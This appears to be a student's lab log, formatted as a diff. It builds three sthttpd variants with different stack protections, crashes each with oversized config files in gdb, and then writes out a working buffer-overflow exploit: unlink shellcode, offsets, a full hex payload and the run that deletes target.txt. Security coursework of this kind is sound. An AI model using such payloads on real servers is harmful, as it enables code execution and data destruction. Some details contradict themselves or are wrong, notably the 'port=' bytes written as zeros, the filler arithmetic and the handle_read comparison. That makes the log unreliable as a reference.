@@ -1,0 +1,499 @@
+==========================================================
+1.)
+Set the start of PATH to /usr/local/cs/bin.
+    COMMAND:
+    PATH=/usr/local/cs/bin:$PATH; export PATH
+
+Check if gcc is running in the correct version (7.2.0)
+      COMMAND:
+      gcc --version
+
+Change directory to where sthttpd-2.27.0.tar.gz is located and then decompress
+ the tar.gz.
+ COMMAND:
+ tar -xvf sthttpd-2.27.0.tar.gz
+
+==========================================================
+2.)
+Build sthttpd-2.27.0 with the patch (manually take out all the lines marked with '-'
+ and add all the line marked with '+'. 
+ COMMAND:
+ ./configure \
+ LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+Compile sthttpd-2.27.0 three times with different flags. The first one is marked sp
+ for -fstack-protector-strong. The second one is marked as for -fsanitize=address.
+ The last one is marked no for -fno-stack-protector -zexecstack. The as one requires
+ the -static-libasan to compile correctly.
+ COMMAND:
+ make clean
+ make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+ mv src/thttpd src/thttpd-sp
+
+ COMMAND:
+ make clean
+ make CFLAGS='-g3 -O2 -static-libasan -fno-inline -fsanitize=address'
+ mv src/thttpd src/thttpd-as
+
+ COMMAND:
+ make clean
+ make CFLAGS='-g3 -O2 -fno-inline -fno-stack-protector -zexecstack'
+ mv src/thttpd src/thttpd-no
+
+==========================================================
+3 / 4.)
+Calculate the port number.
+	  SP = 12330 + 3 * (604805167 % 293) + 1 = 12733
+	  AS = 12330 + 3 * (604805167 % 293) + 2 = 12734
+	  NO = 12330 + 3 * (604805167 % 293) + 3 = 12735
+
+Test the servers by running them. Open a new console, log in with ssh, and check
+ if it is running and outputting the correct file contents.
+SP:
+	COMMAND(1):
+	src/thttpd-sp -p 12733 -D
+
+	COMMAND(2):
+	ps -u classurx
+
+	COMMAND(1):
+	C - c
+	echo 'The server is running' > foo.txt
+	src/thttpd-sp -p 12733 -D
+	
+	COMMAND(2):
+	curl http://localhost:12733/foo.txt
+
+AS:
+	COMMAND(1):
+	src/thttpd-as -p 12734 -D
+
+	COMMAND(2):
+	ps -u classurx
+
+	COMMAND(1):
+	C - c
+	echo 'The server is running' > foo.txt
+	src/thttpd-as -p 12734 -D
+	
+	COMMAND(2):
+	curl http://localhost:12734/foo.txt
+
+NO:
+	COMMAND(1):
+	src/thttpd-no -p 12735 -D
+
+	COMMAND(2):
+	ps -u classurx
+
+	COMMAND(1):
+	C - c
+	echo 'The server is running' > foo.txt
+	src/thttpd-no -p 12735 -D
+	
+	COMMAND(2):
+	curl http://localhost:12735/foo.txt
+
+==========================================================
+5.)
+A text file config.txt must be used to crash thttpd-sp. In the patch, the bug included
+ shortening the array of characters from 1000 to 100. Thus, simply a file with more
+ than 100 characters will cause stack smashing.
+
+Create the following config.txt with emacs:
+       debug debug debug debug debug debug debug debug debug debug debug
+ debug debug debug debug debug debug debug debug debug 
+
+Run GDB. Then run the previously created config.txt with the following flags.
+    COMMAND:
+    gdb src/thttpd-sp
+    (gdb) run -p 12733 -D -C config.txt
+
+It crashes producing the following error message:
+   *** stack smashing detected ***
+
+Run backtrace, which produces the following.
+    COMMAND:
+    (gdb) bt
+
+#0  0x00007ffff760e1f7 in raise () from /lib64/libc.so.6
+#1  0x00007ffff760f8e8 in abort () from /lib64/libc.so.6
+#2  0x00007ffff764df47 in __libc_message () from /lib64/libc.so.6
+#3  0x00007ffff76e8d87 in __fortify_fail () from /lib64/libc.so.6
+#4  0x00007ffff76e8d50 in __stack_chk_fail () from /lib64/libc.so.6
+#5  0x0000000000404edd in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#6  0x00000000004052cf in parse_args (argc=6, argv=argv@entry=0x7fffffffe138)
+    at thttpd.c:893
+#7  0x0000000000403826 in main (argc=<optimized out>, argv=0x7fffffffe138)
+    at thttpd.c:380
+
+The function __stack_chk_fail() was called right before address 
+0x0000000000404edd. To check what was going on at that time, use disassemble.
+		    COMMAND:
+		    (gdb) disas 0x0000000000404edd
+
+Scrolling through the machine code, you find the line:
+	  0x0000000000404edd <+1325>:	mov    %r14,%rsi
+Preceded by:
+	 0x0000000000404ed8 <+1320>:	callq  0x402480 <__stack_chk_fail@plt>
+
+This reveals exactly when __stack_chk_fail() was called. I searched for what machine
+ line jumped to this code and found the following:
+ 0x0000000000404e15 <+1125>:  xor    %fs:0x28,%rax
+ 0x0000000000404e1e <+1134>:  jne    0x404ed8 <read_config+1320>
+
+Here, the canary values are being compared with xor. If they are not equal, it would
+ mean stack smashing occurred, and it would jump to the call _stack_chk_fail()
+ function line, aborting the program.
+
+==========================================================
+6.)
+This is similar to how crashing the SP variant worked, but instead of config.txt with
+ just over 100 characters of "debug ", I used 1000debug.txt with over 1000 characters
+ of "debug ".
+
+Create 1000debug.txt with the over 1000 characters of "debug " using emacs:
+       debug debug debug debug debug ... debug
+
+Run GDB. Then run the previously created config.txt with the following flags.
+    COMMAND:
+    gdb src/thttpd-as
+    (gdb) run -p 12734 -D -C 1000debug.txt
+
+The following error occurs:
+==6342==ERROR: AddressSanitizer: stack-buffer-overflow on address 
+0x7fffffffccc4 at pc 0x000000441de4 bp 0x7fffffffcc20 sp 0x7fffffffc3d0
+READ of size 1000 at 0x7fffffffccc4 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+
+Use backtrace to find where the crash occurred. 
+    COMMAND:
+    (gdb) bt
+
+#0  0x00007ffff7073118 in ?? () from /lib64/libgcc_s.so.1
+#1  0x00007ffff7074019 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004d1863 in __sanitizer::BufferedStackTrace::SlowUnwindStack 
+(this=0x7fffffffaec0, 
+    pc=4464100, max_depth=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_unwind_linux_libcdep.cc:123
+#3  0x0000000000419d7f in __asan::GetStackTraceWithPcBpAndContext 
+(fast=false, context=0x0, 
+    bp=140737488342032, pc=4464100, max_depth=256, stack=0x7fffffffaec0)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_stack.h:50
+#4  __asan::ErrorGeneric::Print (
+    this=this@entry=0x980148 <__asan::ScopedInErrorReport::current_error_+8>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.cc:482
+#5  0x00000000004ccae8 in __asan::ErrorDescription::Print (
+    this=0x980140 <__asan::ScopedInErrorReport::current_error_>)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_errors.h:360
+#6  __asan::ScopedInErrorReport::~ScopedInErrorReport (this=0x7fffffffb737, 
+    __in_chrg=<optimized out>) at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:167
+#7  __asan::ReportGenericError (pc=4464100, bp=bp@entry=140737488342032, 
+    sp=sp@entry=140737488339904, addr=addr@entry=140737488342196, 
+is_write=is_write@entry=false, 
+    access_size=access_size@entry=1000, exp=0, fatal=false)
+    at ../../../../gcc-7.2.0/libsanitizer/asan/asan_report.cc:397
+#8  0x0000000000441e03 in __interceptor_strchr (s=<optimized out>, c=<optimized out>)
+    at ../../../../gcc-7.2.0/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:466
+#9  0x00000000004feb58 in read_config (filename=<optimized out>) at thttpd.c:1018
+#10 0x6564206775626564 in ?? ()
+#11 0x7562656420677562 in ?? ()
+#12 0x2067756265642067 in ?? ()
+#13 0x6564206775626564 in ?? ()
+#14 0x7562656420677562 in ?? ()
+#15 0x2067756265642067 in ?? ()
+#16 0x6564206775626564 in ?? ()
+#17 0x7562656420677562 in ?? ()
+#18 0x2067756265642067 in ?? ()
+#19 0x6564206775626564 in ?? ()
+#20 0x7562656420677562 in ?? ()
+...
+#108 0x0000000000000000 in ?? ()
+
+
+Again, analyze the machine instructions at the read_config() function by using 
+disassemble.
+	COMMAND:
+	(gdb) disas 0x00000000004feb58
+
+Scrolling through the machine code, you find the line:
+	  0x00000000004feb58 <+184>:	test   %rax,%rax
+Preceded by:
+	 0x00000000004feb53 <+179>:	callq  0x442050 <__interceptor_strchr(char const*, int)>
+
+This reveals exactly when __interceptor_strchr() was called. I searched for what 
+machine line jumped to this code and found the following:
+	0x00000000004feabf <+31>:    test   %eax,%eax
+	0x00000000004feac1 <+33>:    jne    0x4ff2df <read_config+2111>
+
+Here, shadow memory is used to protect against stack buffer overflow. The line 
+<+31> checks the shadow memory. If it fails the test, it jumps to the call 
+__interceptor_strchr() function line, aborting the program.
+
+==========================================================
+7.)
+This is similar to how crashing the SP variant and AS variant worked, but instead 
+of config.txt or 1000debug.txt, I used manyport.txt.
+
+Create manyport.txt with the following content with emacs:
+port=12735 port=12735 port=12735 port=12735 port=12735 port=12735 port=12735 
+port=12735 port=12735 port=12735 port=12735 port=12735 port=12735 port=12735 
+port=12735
+
+Run GDB. Then run the previously created manyport.txt with the following flags.
+    COMMAND:
+    gdb src/thttpd-no
+    (gdb) run -p 12735 -D -C manyport.txt
+
+The following error occurs:
+    Program received signal SIGSEGV, Segmentation fault.
+
+Use backtrace to find where the crash occurred. 
+    COMMAND:
+    (gdb) bt
+
+#0  0x0000000000404c8c in read_config (filename=<optimized out>)
+    at thttpd.c:1190
+#1  0x310074726f700035 in ?? ()
+#2  0x0000000035333732 in ?? ()
+#3  0x00007fffffffcf80 in ?? ()
+#4  0x00007fffffffe128 in ?? ()
+#5  0x00007fffffffcf00 in ?? ()
+#6  0x00007fffffffe120 in ?? ()
+#7  0x0000000000000000 in ?? ()
+
+
+Once again, analyze the machine instructions at the read_config() function by using 
+disassemble.
+	COMMAND:
+	(gdb) disas 0x0000000000404c8c
+
+Scrolling through the machine code, you find the line:
+	  0x0000000000404c8c <+1116>:	retq 
+
+In the NO variant, there is no protection against stack buffer overflow, so it's allowed 
+to occur. In this line, the machine instruction tries to return an invalid return address 
+since it was overflowed. Because it's invalid, the program crashes.
+
+==========================================================
+8.)
+Generate the assembly code three times for three variants. Use gcc and replace the 
+-g3 and -c flags with -S. Keep the previous flags used. 
+    COMMAND:
+    ./configure \
+    LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
+
+SP  COMMAND:
+    make clean
+    gcc -I. -I./src -S -O2 -fno-inline -fstack-protector-strong src/thttpd.c
+    mv thttpd.s src/thttpd-sp.s
+
+AS  COMMAND:
+    make clean
+    gcc -I. -I./src -S -O2 -static-libasan -fno-inline -fsanitize=address src/thttpd.c
+    mv thttpd.s src/thttpd-as.s
+
+NO  COMMAND:
+    make clean
+    gcc -I. -I./src -S -O2 -fno-inline -fno-stack-protector -zexecstack src/thttpd.c
+    mv thttpd.s src/thttpd-no.s
+
+To look at the assembly language of the three variant files, use emacs. Then use C-s 
+to search for "handle_read:" to jump to where the handle_read function starts.
+   COMMAND:
+   emacs src/thttpd-sp.s
+   
+   COMMAND:
+   emacs src/thttpd-as.s
+
+   COMMAND:
+   emacs src/thttpd-no.s
+
+Comparing these three, the SP and NO variants both have approximately 4000 lines of 
+code while the AS variant has over twice as much. 
+
+Apart from code locations, SP and NO have essentially identical handle_read() functions. 
+
+The -fstack-protector-strong flag prevents stack buffer overflow for character arrays and 
+local variables and registers by setting up canaries which are checked to see if they are 
+maintained throughout the running of the program. However, not every function requires 
+canaries within it, including handle_read(), which is why SP's handle_read() assembly code 
+is identical to that of AS's. It only checks the canaries before and after the function runs. 
+
+The -fsanitize=address flag prevents stack buffer overflow by checking shadow memory, 
+which is more expensive than canaries. Checking for shadows is much more frequent, 
+which is why the AS variant's handle_read() function is much longer than those of SP 
+and NO.
+
+==========================================================
+9.)
+To delete target.txt, find the hex value of "target.txt". One way of doing this is creating 
+C code that takes "target.txt" as a C-string. Create findhex.c and write the code below. 
+To get the hex value, simply compile the C file and dump the assembly code.
+   COMMAND:
+   emacs findhex.c
+
+int main(){
+    char text[100] = "target.txt";
+    return 0;
+}
+	COMMAND:
+	gcc -c findhex.c
+	objdump -d findhex.o
+
+Disassembly of findhex.o:
+
+0000000000000000 <main>:
+   0:		 55			push   %rbp
+   1:		 48 89 e5             	mov    %rsp,%rbp
+   4:		 48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
+   b:		 74 2e 74 
+   e:		 ba 78 74 00 00		mov    $0x7478,%edx
+  13:		 48 89 45 90          	mov    %rax,-0x70(%rbp)
+  17:		 48 89 55 98          	mov    %rdx,-0x68(%rbp)
+  1b:		 48 8d 55 a0          	lea    -0x60(%rbp),%rdx
+  1f:		 b8 00 00 00 00       	mov    $0x0,%eax
+  24:		 b9 0a 00 00 00       	mov    $0xa,%ecx
+  29:		 48 89 d7             	mov    %rdx,%rdi
+  2c:		 f3 48 ab             	rep stos %rax,%es:(%rdi)
+  2f:		 48 89 fa             	mov    %rdi,%rdx
+  32:		 89 02                	mov    %eax,(%rdx)
+  34:		 48 83 c2 04          	add    $0x4,%rdx
+  38:		 b8 00 00 00 00       	mov    $0x0,%eax
+  3d:		 5d                   	pop    %rbp
+  3e:		 c3                   	retq   
+
+From this, we can take the following lines and combine the values within to get 
+the hex code of "target.txt\0". This includes the null byte at the end.
+
+   4:	48 b8 74 61 72 67 65 	movabs $0x742e746567726174,%rax
+   e:	ba 78 74 00 00       	mov    $0x7478,%edx
+  1f:	b8 00 00 00 00       	mov    $0x0,%eax
+  38:	b8 00 00 00 00       	mov    $0x0,%eax
+
+The hex value is: 74 61 72 67 65 74 2e 74 78 74 00
+This is 11 bytes.
+
+In addition to the hex value, we also need to find the span of the stack buffer, the 
+distance from the stack pointer to . We can do this by running GDB and set breakpoints 
+at handle_read. Then, print line address.
+   COMMAND:
+   gdb src/thttpd-no
+   (gdb) break handle_read
+   (gdb) run -p 12735 -D -C manyport.txt
+   (gdb) print &line
+
+$1 = (char (*)[100]) 0x7fffffffcde0
+
+Convert this into 8-byte hex value (little endian):
+	e0 cd ff ff ff 7f 00 00
+
+	COMMAND:
+	(gdb) info registers $rsp
+
+rsp            0x7fffffffce78	0x7fffffffce78
+
+The stack pointer points to the return value and the print &line functions found the 
+address of the beginning of the array. To find the difference, subtract the hex values.
+
+0x7fffffffce78 - 0x7fffffffcde0 = 0x98 = 152
+
+Calculate the address of the file taking into account the length of "target.txt" and 
+"debug".
+
+11 ("target.txt\0") + 5 ("debug") = 16 ==> 10 hex value
+
+0x7fffffffce78 - 0x10 = 0x7fffffffce68 
+
+
+Now, find out the hex code of the code to delete a file. Create the assembly code 
+for deleting a file.
+    COMMAND:
+    emacs findex.s
+
+movq    $0x57, %rax
+movq    $0x7fffffffce68, %rdi
+syscall
+
+Note, the sys call number for sys_unlink is 87. In hexadecimal, this is 0x57. After the 
+S file is created, compile it. Then, dump the assembly code.
+  COMMAND: 
+  gcc -c findex.s
+  objdump -d findex.o
+
+Disassembly of section .text:
+
+0000000000000000 <.text>:
+   0:		 48 c7 c0 57 00 00 00	mov    $0x57,%rax
+   7:		 48 bf 68 ce ff ff ff 	movabs $0x7fffffffce68,%rdi
+   e:		 7f 00 00 
+  11:		 0f 05			syscall 
+
+Hex code (little endian): 48 c7 c0 57 00 00 00 48 bf 68 ce ff ff ff 7f 00 00 0f 05
+This is 19 bytes.
+
+The exploit code is located 8 bytes after "debug", so we need to push the return 
+address by 8 bytes
+
+0x7fffffffcde0 + 0x8 = 0x7fffffffcde8
+e8 cd ff ff ff 7f 00 00
+
+Thus, the final exploit code can be compiled by filling in the blank space with 
+filler bytes (00). Calculate the number of filler bytes needed.
+
+152 bytes - 19(exploit code) - 16("target.txt\0") - 8("debug")= 109 filler bytes
+
+"port=" still need to be accounted for in the beginning.
+
+[00 00 00] ("port=") + 
+[48 c7 c0 57 00 00 00 48 bf 68 ce ff ff ff 7f 00 00 0f 05] (exploit code) +
+[00 00 00 ... 00] (filler bytes) +
+[74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00] ("target.txt\0") +
+[e8 cd ff ff ff 7f 00 00] (return address)
+
+=
+
+00 00 00 48 c7 c0 57 00 00 00 48 bf 68 ce ff ff ff 7f 00 00 0f 05 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 00 74 61 72 67 65 74 2e 74 78 74 00 00 00 00 00 00 
+e8 cd ff ff ff 7f 00 00
+
+Type this text into a txt file called hexa.txt.
+     COMMAND:
+     emacs hexa.txt
+
+Download hex2raw to convert this from ASCII to real hex code.
+
+Give yourself permission to write.
+     COMMAND:
+     chmod a+x hex2raw
+
+Convert. After the conversion, make sure you delete the newline character.
+	 COMMAND:
+	 cat hexa.txt | ./hex2raw > exploit.txt
+	 emacs exploit.txt
+
+./hex2raw < hexa.txt >> exploit2.txt
+
+Create target.txt. Check if it exists.
+       COMMAND:
+       emacs target.txt
+       ls target.txt
+
+Run GDB, and test to see if exploit.txt works.
+    COMMAND:
+    gdb src/thttpd-no
+    (gdb) run -p 12735 -D -C exploit.txt
+
+Recheck is target.txt still exists.
+	ls target.txt
+
+This produces the following error, successfully deleting target.txt
+ls: cannot access target.txt: No such file or directory
+
+==========================================================
